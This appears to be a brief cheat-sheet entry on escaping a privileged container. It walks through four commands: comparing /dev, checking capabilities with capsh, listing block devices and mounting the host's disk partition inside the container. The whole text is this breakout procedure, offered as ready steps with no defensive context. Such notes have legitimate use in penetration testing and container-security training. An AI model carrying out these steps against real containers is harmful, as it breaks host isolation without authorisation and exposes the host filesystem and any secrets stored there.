# Disk Mount

### 1) Compare /dev

Confirm exactly how much --privileged flag actually hands you

    ls /dev | wc -l

If host's /dev is dramatically larger, it means that the host's real block devices are exposed directly.

### 2) Confirm the Capability Set

Check the "Bounding set" line to confirm the grant.

    capsh --print

### 3) List block devices

    lsblk

### 4) Mount the Host Disk

    mkdir /mnt/hostdisk && mount /dev/loopNUMp1 /mnt/hostdisk
    mount | grep hostdisk
